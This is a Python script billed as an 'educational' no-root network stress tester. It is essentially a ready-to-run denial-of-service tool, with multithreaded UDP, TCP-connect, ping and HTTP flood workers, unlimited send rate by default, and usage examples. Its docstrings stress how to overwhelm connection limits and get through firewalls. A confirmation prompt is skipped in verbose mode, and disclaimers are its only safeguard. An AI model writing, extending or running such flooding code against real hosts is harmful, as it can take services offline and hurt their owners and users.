#!/usr/bin/env python3
"""
Network Stress Testing Tool - No Root Required
==============================================

EDUCATIONAL PURPOSE ONLY - FOR AUTHORIZED NETWORK TESTING ONLY

This version of the network stress testing tool works without root privileges
while still providing effective network stress testing capabilities for WiFi
performance research and educational purposes.

WARNING: Only use this tool on networks you own or have explicit permission to test.
Unauthorized use may violate laws and network policies.

Author: Educational Research Tool
License: Educational Use Only
"""

import socket
import threading
import time
import random
import argparse
import sys
import os
import signal
import subprocess
from dataclasses import dataclass
from typing import List, Dict, Any
import ipaddress

# Check for required modules and provide installation instructions
try:
    import psutil
except ImportError:
    print("Error: psutil module required. Install with: pip install psutil")
    sys.exit(1)

@dataclass
class StressTestConfig:
    """Configuration class for stress test parameters"""
    target_ip: str
    target_port: int
    thread_count: int
    packet_size: int
    packets_per_second: int
    duration: int
    test_types: List[str]
    verbose: bool = False

class NoRootNetworkStressTester:
    """
    Network Stress Testing Tool - No Root Required
    
    This class implements network stress testing techniques that work without
    root privileges:
    1. UDP Flood - Saturates bandwidth with UDP packets
    2. TCP Connect Flood - Exhausts connection resources with real connections
    3. System Ping Flood - Generates latency spikes using system ping
    4. HTTP Request Flood - Application-layer stress testing
    """
    
    def __init__(self, config: StressTestConfig):
        self.config = config
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'bytes_sent': 0,
            'errors': 0,
            'start_time': 0,
            'threads_active': 0
        }
        self.threads = []
        
        # Validate target IP
        try:
            ipaddress.ip_address(config.target_ip)
        except ValueError:
            raise ValueError(f"Invalid target IP address: {config.target_ip}")
    
    def print_banner(self):
        """Display tool banner and warnings"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║            NETWORK STRESS TESTING TOOL (NO ROOT)             ║
║                   EDUCATIONAL USE ONLY                       ║
╠══════════════════════════════════════════════════════════════╣
║  WARNING: Only use on networks you own or have permission    ║
║  to test. Unauthorized use may be illegal and unethical.     ║
║                                                              ║
║  This version works without root privileges while still      ║
║  providing effective network stress testing capabilities.    ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"Target: {self.config.target_ip}:{self.config.target_port}")
        print(f"Test Types: {', '.join(self.config.test_types)}")
        print(f"Threads: {self.config.thread_count}")
        print(f"Duration: {self.config.duration} seconds")
        print("=" * 64)
    
    def udp_flood_worker(self, thread_id: int):
        """
        UDP Flood Worker Thread - No Root Required
        
        This function implements UDP flooding using standard sockets, which
        saturates network bandwidth by sending large volumes of UDP packets.
        
        Mechanism:
        - Creates standard UDP socket (no raw socket needed)
        - Generates packets with configurable payload
        - Sends packets at controlled rate to target
        - Tracks statistics for monitoring
        
        Why it works without root:
        - Uses standard socket.SOCK_DGRAM (not raw sockets)
        - OS handles IP header creation
        - Still achieves bandwidth saturation
        """
        try:
            # Create UDP socket - no root required
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Set socket to non-blocking for better performance
            sock.setblocking(False)
            
            # Generate payload data
            payload = b'A' * self.config.packet_size
            target = (self.config.target_ip, self.config.target_port)
            
            packets_sent = 0
            last_rate_check = time.time()
            
            while self.running:
                try:
                    # Send UDP packet
                    sock.sendto(payload, target)
                    packets_sent += 1
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(payload)
                    
                    # Rate limiting - control packets per second
                    current_time = time.time()
                    elapsed = current_time - last_rate_check
                    
                    if elapsed >= 1.0:  # Check rate every second
                        if self.config.packets_per_second > 0 and packets_sent > self.config.packets_per_second:
                            # Sleep to maintain target rate
                            sleep_time = 1.0 - elapsed
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                        
                        packets_sent = 0
                        last_rate_check = current_time
                    
                    # Micro-delay to prevent CPU saturation
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                
                except socket.error as e:
                    # Handle non-blocking socket errors
                    if e.errno not in [11, 35]:  # EAGAIN, EWOULDBLOCK
                        self.stats['errors'] += 1
                        if self.config.verbose:
                            print(f"UDP Thread {thread_id} error: {e}")
                    time.sleep(0.001)  # Brief pause on error
            
            sock.close()
            
        except Exception as e:
            print(f"UDP Thread {thread_id} crashed: {e}")
            self.stats['errors'] += 1
    
    def tcp_connect_flood_worker(self, thread_id: int):
        """
        TCP Connect Flood Worker Thread - No Root Required
        
        This implements TCP connection flooding using real connections rather
        than raw SYN packets. While less efficient than SYN flood, it still
        consumes server resources and works without root privileges.
        
        Mechanism:
        - Creates real TCP connections to target
        - Establishes full 3-way handshake
        - Optionally sends data before closing
        - Consumes server connection resources
        - Can overwhelm connection limits
        
        Advantages over SYN flood:
        - No root privileges required
        - Works through firewalls/NAT
        - Creates realistic connection load
        """
        try:
            connections_made = 0
            last_rate_check = time.time()
            
            while self.running:
                try:
                    # Create TCP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.0)  # Short timeout
                    
                    # Connect to target
                    result = sock.connect_ex((self.config.target_ip, self.config.target_port))
                    
                    if result == 0:  # Connection successful
                        connections_made += 1
                        self.stats['connections_made'] += 1
                        
                        # Optionally send some data to increase load
                        try:
                            data = b'GET / HTTP/1.0\r\n\r\n'
                            sock.send(data)
                            self.stats['bytes_sent'] += len(data)
                        except:
                            pass
                        
                        # Keep connection open briefly to consume resources
                        time.sleep(0.1)
                    
                    sock.close()
                    
                    # Rate limiting
                    current_time = time.time()
                    elapsed = current_time - last_rate_check
                    
                    if elapsed >= 1.0:
                        if self.config.packets_per_second > 0 and connections_made > self.config.packets_per_second:
                            sleep_time = 1.0 - elapsed
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                        
                        connections_made = 0
                        last_rate_check = current_time
                    
                    # Rate control
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                
                except Exception as e:
                    self.stats['errors'] += 1
                    if self.config.verbose:
                        print(f"TCP Connect Thread {thread_id} error: {e}")
                    time.sleep(0.01)
            
        except Exception as e:
            print(f"TCP Connect Thread {thread_id} crashed: {e}")
            self.stats['errors'] += 1
    
    def ping_flood_worker(self, thread_id: int):
        """
        System Ping Flood Worker Thread - No Root Required
        
        This implements ICMP flooding using the system's ping command rather
        than raw sockets. While less efficient, it still generates latency
        spikes and network congestion without requiring root privileges.
        
        Mechanism:
        - Uses subprocess to call system ping
        - Generates rapid ping requests
        - Creates processing overhead on target
        - Consumes network bandwidth
        
        Advantages:
        - No root privileges required
        - Uses optimized system ping
        - Cross-platform compatible
        """
        try:
            pings_sent = 0
            last_rate_check = time.time()
            
            # Determine ping command based on OS
            if os.name == 'nt':  # Windows
                ping_cmd = ['ping', '-n', '1', '-w', '1000', self.config.target_ip]
            else:  # Linux/macOS
                ping_cmd = ['ping', '-c', '1', '-W', '1', self.config.target_ip]
            
            while self.running:
                try:
                    # Execute ping command
                    result = subprocess.run(ping_cmd, 
                                          capture_output=True, 
                                          timeout=2)
                    
                    pings_sent += 1
                    self.stats['packets_sent'] += 1
                    
                    # Rate limiting
                    current_time = time.time()
                    elapsed = current_time - last_rate_check
                    
                    if elapsed >= 1.0:
                        if self.config.packets_per_second > 0 and pings_sent > self.config.packets_per_second:
                            sleep_time = 1.0 - elapsed
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                        
                        pings_sent = 0
                        last_rate_check = current_time
                    
                    # Rate control
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                    else:
                        time.sleep(0.01)  # Prevent excessive CPU usage
                
                except subprocess.TimeoutExpired:
                    self.stats['errors'] += 1
                except Exception as e:
                    self.stats['errors'] += 1
                    if self.config.verbose:
                        print(f"Ping Thread {thread_id} error: {e}")
                    time.sleep(0.1)
            
        except Exception as e:
            print(f"Ping Thread {thread_id} crashed: {e}")
            self.stats['errors'] += 1
    
    def http_flood_worker(self, thread_id: int):
        """
        HTTP Request Flood Worker Thread - No Root Required
        
        This implements application-layer flooding by sending HTTP requests.
        This creates realistic application load and works without any special
        privileges while still consuming server resources.
        
        Mechanism:
        - Creates HTTP connections to target
        - Sends GET/POST requests rapidly
        - Consumes application server resources
        - Tests application-layer performance
        """
        try:
            requests_sent = 0
            last_rate_check = time.time()
            
            while self.running:
                try:
                    # Create TCP socket for HTTP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    
                    # Connect to target
                    sock.connect((self.config.target_ip, self.config.target_port))
                    
                    # Send HTTP request
                    http_request = (
                        f"GET /{random.randint(1,10000)} HTTP/1.1\r\n"
                        f"Host: {self.config.target_ip}\r\n"
                        f"User-Agent: NetworkStressTester/1.0\r\n"
                        f"Connection: close\r\n\r\n"
                    ).encode()
                    
                    sock.send(http_request)
                    
                    # Try to read response (creates more realistic load)
                    try:
                        response = sock.recv(1024)
                    except:
                        pass
                    
                    sock.close()
                    
                    requests_sent += 1
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(http_request)
                    
                    # Rate limiting
                    current_time = time.time()
                    elapsed = current_time - last_rate_check
                    
                    if elapsed >= 1.0:
                        if self.config.packets_per_second > 0 and requests_sent > self.config.packets_per_second:
                            sleep_time = 1.0 - elapsed
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                        
                        requests_sent = 0
                        last_rate_check = current_time
                    
                    # Rate control
                    if self.config.packets_per_second > 0:
                        time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                
                except Exception as e:
                    self.stats['errors'] += 1
                    if self.config.verbose:
                        print(f"HTTP Thread {thread_id} error: {e}")
                    time.sleep(0.01)
            
        except Exception as e:
            print(f"HTTP Thread {thread_id} crashed: {e}")
            self.stats['errors'] += 1
    
    def mixed_protocol_worker(self, thread_id: int):
        """
        Mixed Protocol Worker - No Root Required
        
        This worker randomly selects between available protocols
        to create realistic mixed-traffic stress patterns.
        """
        protocols = ['udp', 'tcp_connect', 'ping', 'http']
        
        while self.running:
            try:
                # Randomly select protocol for this iteration
                protocol = random.choice(protocols)
                
                if protocol == 'udp':
                    self.send_udp_packet()
                elif protocol == 'tcp_connect':
                    self.send_tcp_connection()
                elif protocol == 'ping':
                    self.send_ping()
                elif protocol == 'http':
                    self.send_http_request()
                
                # Rate limiting
                if self.config.packets_per_second > 0:
                    time.sleep(1.0 / self.config.packets_per_second / self.config.thread_count)
                else:
                    time.sleep(0.01)
            
            except Exception as e:
                self.stats['errors'] += 1
                if self.config.verbose:
                    print(f"Mixed Protocol Thread {thread_id} error: {e}")
                time.sleep(0.01)
    
    def send_udp_packet(self):
        """Helper method to send single UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b'A' * min(self.config.packet_size, 1024)
            sock.sendto(payload, (self.config.target_ip, self.config.target_port))
            sock.close()
            
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(payload)
        except:
            self.stats['errors'] += 1
    
    def send_tcp_connection(self):
        """Helper method to make single TCP connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            result = sock.connect_ex((self.config.target_ip, self.config.target_port))
            if result == 0:
                self.stats['connections_made'] += 1
            sock.close()
            self.stats['packets_sent'] += 1
        except:
            self.stats['errors'] += 1
    
    def send_ping(self):
        """Helper method to send single ping"""
        try:
            if os.name == 'nt':
                ping_cmd = ['ping', '-n', '1', '-w', '500', self.config.target_ip]
            else:
                ping_cmd = ['ping', '-c', '1', '-W', '1', self.config.target_ip]
            
            subprocess.run(ping_cmd, capture_output=True, timeout=1)
            self.stats['packets_sent'] += 1
        except:
            self.stats['errors'] += 1
    
    def send_http_request(self):
        """Helper method to send single HTTP request"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((self.config.target_ip, self.config.target_port))
            
            request = f"GET / HTTP/1.0\r\nHost: {self.config.target_ip}\r\n\r\n".encode()
            sock.send(request)
            sock.close()
            
            self.stats['packets_sent'] += 1
            self.stats['bytes_sent'] += len(request)
        except:
            self.stats['errors'] += 1
    
    def monitor_stats(self):
        """
        Statistics monitoring thread
        Displays real-time performance metrics
        """
        print("\nStarting network stress test (no root required)...")
        print("Press Ctrl+C to stop\n")
        
        while self.running:
            try:
                elapsed = time.time() - self.stats['start_time']
                pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
                mbps = (self.stats['bytes_sent'] * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
                
                print(f"\r[{elapsed:.1f}s] Packets: {self.stats['packets_sent']:,} | "
                      f"Connections: {self.stats['connections_made']:,} | "
                      f"Rate: {pps:.1f} pps | Bandwidth: {mbps:.2f} Mbps | "
                      f"Errors: {self.stats['errors']} | "
                      f"Threads: {threading.active_count()-2}", end="", flush=True)
                
                time.sleep(1)
            
            except Exception as e:
                if self.config.verbose:
                    print(f"\nMonitoring error: {e}")
                time.sleep(1)
    
    def start_test(self):
        """
        Main test execution method
        Starts all worker threads based on configured test types
        """
        self.print_banner()
        
        # Confirm execution
        if not self.config.verbose:
            confirm = input("\nAre you authorized to test this network? (yes/no): ")
            if confirm.lower() != 'yes':
                print("Test cancelled.")
                return
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Start worker threads based on test types
        thread_id = 0
        
        for test_type in self.config.test_types:
            for i in range(self.config.thread_count):
                if test_type == 'udp':
                    thread = threading.Thread(target=self.udp_flood_worker, args=(thread_id,))
                elif test_type == 'tcp_connect':
                    thread = threading.Thread(target=self.tcp_connect_flood_worker, args=(thread_id,))
                elif test_type == 'ping':
                    thread = threading.Thread(target=self.ping_flood_worker, args=(thread_id,))
                elif test_type == 'http':
                    thread = threading.Thread(target=self.http_flood_worker, args=(thread_id,))
                elif test_type == 'mixed':
                    thread = threading.Thread(target=self.mixed_protocol_worker, args=(thread_id,))
                else:
                    continue
                
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
                thread_id += 1
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_stats)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            # Run for specified duration
            if self.config.duration > 0:
                time.sleep(self.config.duration)
            else:
                # Run indefinitely until Ctrl+C
                while True:
                    time.sleep(1)
        
        except KeyboardInterrupt:
            print("\n\nStopping test...")
        
        finally:
            self.stop_test()
    
    def stop_test(self):
        """Stop all test threads and display final statistics"""
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)
        
        # Display final statistics
        elapsed = time.time() - self.stats['start_time']
        total_packets = self.stats['packets_sent']
        total_connections = self.stats['connections_made']
        total_bytes = self.stats['bytes_sent']
        avg_pps = total_packets / elapsed if elapsed > 0 else 0
        avg_mbps = (total_bytes * 8) / (1024 * 1024 * elapsed) if elapsed > 0 else 0
        
        print(f"\n\n{'='*60}")
        print("FINAL STATISTICS")
        print(f"{'='*60}")
        print(f"Duration:        {elapsed:.2f} seconds")
        print(f"Total Packets:   {total_packets:,}")
        print(f"TCP Connections: {total_connections:,}")
        print(f"Total Bytes:     {total_bytes:,} ({total_bytes/(1024*1024):.2f} MB)")
        print(f"Average PPS:     {avg_pps:.1f}")
        print(f"Average Mbps:    {avg_mbps:.2f}")
        print(f"Errors:          {self.stats['errors']}")
        print(f"Success Rate:    {((total_packets-self.stats['errors'])/total_packets*100):.1f}%" if total_packets > 0 else "N/A")
        print(f"{'='*60}")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n\nReceived interrupt signal. Stopping...")
    sys.exit(0)

def validate_config(config: StressTestConfig) -> bool:
    """Validate configuration parameters"""
    if config.thread_count <= 0 or config.thread_count > 1000:
        print("Error: Thread count must be between 1 and 1000")
        return False
    
    if config.packet_size < 1 or config.packet_size > 65507:
        print("Error: Packet size must be between 1 and 65507 bytes")
        return False
    
    if config.packets_per_second < 0:
        print("Error: Packets per second must be non-negative")
        return False
    
    if not config.test_types:
        print("Error: At least one test type must be specified")
        return False
    
    valid_types = ['udp', 'tcp_connect', 'ping', 'http', 'mixed']
    for test_type in config.test_types:
        if test_type not in valid_types:
            print(f"Error: Invalid test type '{test_type}'. Valid types: {valid_types}")
            return False
    
    return True

def main():
    """Main function with command-line argument parsing"""
    parser = argparse.ArgumentParser(
        description="Network Stress Testing Tool - No Root Required - Educational Use Only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # UDP flood test (no root required)
  python3 network_stress_tester_noroot.py -t 192.168.1.1 -p 80 --test-types udp --threads 10 --pps 1000

  # TCP connection flood
  python3 network_stress_tester_noroot.py -t 192.168.1.1 -p 80 --test-types tcp_connect --threads 15

  # Mixed protocol test
  python3 network_stress_tester_noroot.py -t 192.168.1.1 -p 80 --test-types mixed --threads 5 --duration 30

  # HTTP application flood
  python3 network_stress_tester_noroot.py -t 192.168.1.1 -p 80 --test-types http --threads 20

WARNING: Only use on networks you own or have explicit permission to test!
        """
    )
    
    parser.add_argument('-t', '--target', required=True, 
                       help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80,
                       help='Target port (default: 80)')
    parser.add_argument('--test-types', nargs='+', 
                       choices=['udp', 'tcp_connect', 'ping', 'http', 'mixed'],
                       default=['udp'],
                       help='Types of tests to run (default: udp)')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of threads per test type (default: 10)')
    parser.add_argument('--packet-size', type=int, default=1024,
                       help='Packet size in bytes (default: 1024)')
    parser.add_argument('--pps', type=int, default=0,
                       help='Packets per second per thread (0 = unlimited, default: 0)')
    parser.add_argument('--duration', type=int, default=0,
                       help='Test duration in seconds (0 = until Ctrl+C, default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Create configuration
    config = StressTestConfig(
        target_ip=args.target,
        target_port=args.port,
        thread_count=args.threads,
        packet_size=args.packet_size,
        packets_per_second=args.pps,
        duration=args.duration,
        test_types=args.test_types,
        verbose=args.verbose
    )
    
    # Validate configuration
    if not validate_config(config):
        sys.exit(1)
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create and start tester
    tester = NoRootNetworkStressTester(config)
    tester.start_test()

if __name__ == "__main__":
    main()